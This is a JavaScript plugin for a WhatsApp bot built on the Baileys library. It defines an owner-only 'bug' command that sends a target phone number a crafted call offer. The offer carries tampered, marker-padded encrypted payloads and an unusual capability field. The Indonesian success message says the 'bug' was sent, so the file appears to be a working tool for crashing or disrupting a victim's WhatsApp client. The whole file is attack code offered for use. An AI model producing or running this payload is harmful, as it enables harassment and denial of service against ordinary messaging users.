import crypto from "crypto"
import { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } from "@whiskeysockets/baileys"

async function Fchery(conn, abiescc, isVideo = false) {
    try {
        const devices = (
            await conn.getUSyncDevices([abiescc], false, false)
        ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`)

        await conn.assertSessions(devices)

        const createMutex = () => {
            const locks = new Map()
            return {
                async mutex(key, fn) {
                    while (locks.has(key)) await locks.get(key)
                    const lock = Promise.resolve().then(fn)
                    locks.set(key, lock)
                    try {
                        return await lock
                    } finally {
                        locks.delete(key)
                    }
                }
            }
        }

        const mutexManager = createMutex()

        const appendBufferMarker = buffer => {
            const newBuffer = Buffer.alloc(buffer.length + 8)
            buffer.copy(newBuffer)
            newBuffer.fill(1, buffer.length)
            return newBuffer
        }

        const originalCreateParticipantNodes = conn.createParticipantNodes?.bind(conn)
        const originalEncodeWAMessage = conn.encodeWAMessage?.bind(conn)

        conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) {
                return { nodes: [], shouldIncludeDeviceIdentity: false }
            }

            const processedMessage = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message)
            const messagePairs = Array.isArray(processedMessage)
                ? processedMessage
                : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }))

            const { id: meId, lid: meLid } = conn.authState.creds.me
            const localUser = meLid ? jidDecode(meLid)?.user : null
            let shouldIncludeDeviceIdentity = false

            const nodes = await Promise.all(
                messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
                    const { user: targetUser } = jidDecode(jid)
                    const { user: ownUser } = jidDecode(meId)
                    const isOwnUser = targetUser === ownUser || targetUser === localUser
                    const isSelf = jid === meId || jid === meLid

                    if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage

                    const encodedBytes = appendBufferMarker(
                        originalEncodeWAMessage
                            ? originalEncodeWAMessage(msg)
                            : encodeWAMessage(msg)
                    )

                    return mutexManager.mutex(jid, async () => {
                        const { type, ciphertext } = await conn.signalRepository.encryptMessage({
                            jid,
                            data: encodedBytes
                        })

                        if (type === "pkmsg") shouldIncludeDeviceIdentity = true

                        return {
                            tag: "to",
                            attrs: { jid },
                            content: [{
                                tag: "enc",
                                attrs: { v: "2", type, ...extraAttrs },
                                content: ciphertext
                            }]
                        }
                    })
                })
            )

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity }
        }

        const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase()

        const { nodes: destinations, shouldIncludeDeviceIdentity } =
            await conn.createParticipantNodes(devices, { conversation: "call-initiated" }, { count: "0" })

        const callmeabiescc = {
            tag: "call",
            attrs: {
                to: abiescc,
                id: conn.generateMessageTag(),
                from: conn.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": conn.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    ...(isVideo ? [{
                        tag: "video",
                        attrs: {
                            enc: "vp8",
                            dec: "vp8",
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0"
                        }
                    }] : []),
                    { tag: "net", attrs: { medium: "3" } },
                    {
                        tag: "capability",
                        attrs: { ver: "1" },
                        content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                    },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(conn.authState.creds.account, true)
                    }] : [])
                ].filter(Boolean)
            }]
        }

        await conn.sendNode(callmeabiescc)
    } catch (e) {
        throw e
    }
}

let handler = async (m, { conn, args }) => {
    if (!args[0]) return m.reply("Masukan nomor")

    let nomor = args[0].replace(/[^0-9]/g, "")
    let jid = nomor + "@s.whatsapp.net"

    await Fchery(conn, jid)

    m.reply(`Sukses terkirim bug oleh nomor ${nomor}`)
}

handler.command = ["bug"]
handler.owner = true
handler.tags = ["owner"]
handler.help = ["bug nomor"]

export default handler